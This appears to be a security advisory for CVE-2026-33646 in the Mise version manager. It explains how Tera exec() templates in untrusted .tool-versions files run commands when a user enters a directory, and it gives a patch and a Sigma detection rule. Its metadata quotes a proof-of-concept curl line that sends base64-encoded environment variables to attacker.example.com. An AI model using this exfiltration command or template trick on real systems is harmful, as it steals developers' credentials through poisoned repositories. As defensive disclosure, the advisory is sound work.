---
title: Mise Vulnerable to Arbitrary Code Execution via Tera Templates in .tool-versions Files (Trust Bypass)
slug: 2026-07-mise-rce-tool-versions
description: A critical vulnerability (CVE-2026-33646) in Mise allows for arbitrary code execution on victim machines via malicious `.tool-versions` files containing Tera template syntax, which are processed without trust verification, enabling silent supply chain attacks upon directory entry.
date: "2026-07-03T11:07:52Z"
type: advisory
types:
  - advisory
severities:
  - critical
tags:
  - mise
  - rce
  - supply-chain
  - trust-bypass
  - code-execution
  - developer-tools
  - cve
vendors:
  - mise
products:
  - mise (< 2026.3.10)
affected_os:
  - Linux
  - macOS
  - Windows
mitre_ttps:
  - tactic_id: TA0001
    tactic_name: Initial Access
    technique_id: T1204
    technique_name: User Execution
    evidence: An attacker creates a Git repository containing a malicious `.tool-versions` file... The victim clones the repository and... `cd`s into the directory, arbitrary commands execute.
    confidence_band: high
  - tactic_id: TA0002
    tactic_name: Execution
    technique_id: T1059
    technique_name: Command and Scripting Interpreter
    evidence: '`tera.register_function(''exec'', tera_exec(...))` ... `tera_exec` passes the `command` argument to a shell for execution with no restrictions.'
    confidence_band: high
  - tactic_id: TA0006
    tactic_name: Credential Access
    technique_id: T1552
    technique_name: Unsecured Credentials
    evidence: Alternative PoC (`curl -s -X POST -d "$(env | base64)" ...`) demonstrates data exfiltration of `env` (environment variables, potentially including tokens, credentials).
    confidence_band: high
  - tactic_id: TA0010
    tactic_name: Exfiltration
    technique_id: T1041
    technique_name: Exfiltration Over C2 Channel
    evidence: Alternative PoC (`curl -s -X POST -d "$(env | base64)" https://attacker.example.com/collect -o /dev/null`) demonstrates sending data to an external server.
    confidence_band: high
  - tactic_id: TA0009
    tactic_name: Impact
    technique_id: T1195
    technique_name: Supply Chain Compromise
    evidence: 'Supply chain attack vector: `.tool-versions` is a widely-used convention from asdf-vm and is commonly committed to repositories.'
    confidence_band: high
cves:
  - id: CVE-2026-33646
    cvss: 9.6
    epss: 0.00685
references:
  - https://github.com/advisories/GHSA-fjj5-v948-whjj
rules:
  - title: Detect CVE-2026-33646 Exploitation — Mise Arbitrary Code Execution via Curl Data Exfiltration
    description: Detects CVE-2026-33646 exploitation where a malicious mise `.tool-versions` file triggers arbitrary code execution to exfiltrate environment variables using `curl`.
    platform: sigma
    severity: high
    tactics:
      - credential_access
      - execution
      - exfiltration
    techniques:
      - T1041
      - T1059.004
      - T1552
    data_sources:
      - process_creation
      - linux
rules_count: 1
---

A critical vulnerability, tracked as CVE-2026-33646, affects Mise, a popular multi-tool version manager. This flaw allows for arbitrary code execution on user systems when processing `.tool-versions` files. Unlike `.mise.toml` files, `.tool-versions` are not subject to a trust verification mechanism in non-paranoid mode (which is the default). This means an attacker can embed malicious Tera template syntax, specifically using the `exec()` function, into a `.tool-versions` file within a Git repository. When a victim, with `mise` activated, changes directory (`cd`) into such a repository, the malicious commands execute silently and automatically, leveraging the full privileges and environment variables of the current user. The vulnerability affects Mise versions prior to 2026.3.10 and poses a significant supply chain risk to developers.

## Attack Chain

1. An attacker crafts a malicious `.tool-versions` file containing `Tera` template syntax with an `exec()` function call (e.g., `{{ exec(command="malicious_command") }}`) and embeds it in a Git repository.
2. The victim, who has `mise` activated in their shell (e.g., `eval "$(mise activate zsh)"`), clones or downloads this malicious Git repository.
3. The victim navigates into the cloned repository's directory using a command like `cd`.
4. Mise's shell hook (`hook-env`) automatically triggers, initiating the parsing of configuration files, including the malicious `.tool-versions` file.
5. During parsing, the `ToolVersions::parse_str` function processes the `.tool-versions` file content through the `Tera` template engine without performing a trust check.
6. The `Tera` engine evaluates the embedded `exec()` function, which in turn spawns a shell process to execute the attacker-defined arbitrary command (e.g., `curl` for exfiltration or `id` for reconnaissance).
7. The malicious command executes silently as the victim's current user with their full environment, without any warning or user interaction.
8. This allows the attacker to achieve arbitrary code execution, potentially leading to data exfiltration, further compromise, or system modification, as demonstrated by the PoC's `curl` or `id` commands.

## Impact

The successful exploitation of CVE-2026-33646 leads to arbitrary code execution on the victim's machine. This presents a critical supply chain attack vector, as `.tool-versions` files are commonly committed to repositories and are expected to be benign. Execution occurs silently without any user prompt or warning, running with the full privileges and environment of the current user. This allows attackers to perform actions such as credential theft by exfiltrating environment variables (which may contain tokens, API keys, or SSH agent information) or establishing further persistence. The widespread use of `mise` in development environments means a broad range of open-source projects and developer machines are potentially vulnerable.

## Recommendation

* Patch CVE-2026-33646 by updating `mise` to version 2026.3.10 or newer immediately.
* Deploy the provided Sigma rule to detect suspicious `curl` commands used for data exfiltration, often indicative of arbitrary code execution.
* Enable `process_creation` logging for shell processes (`bash`, `zsh`, `powershell`, `cmd.exe`) to capture commands executed in user environments, especially in newly cloned or untrusted repositories.
* Review and implement the recommended trust checks for `.tool-versions` files if patching is not immediately feasible.
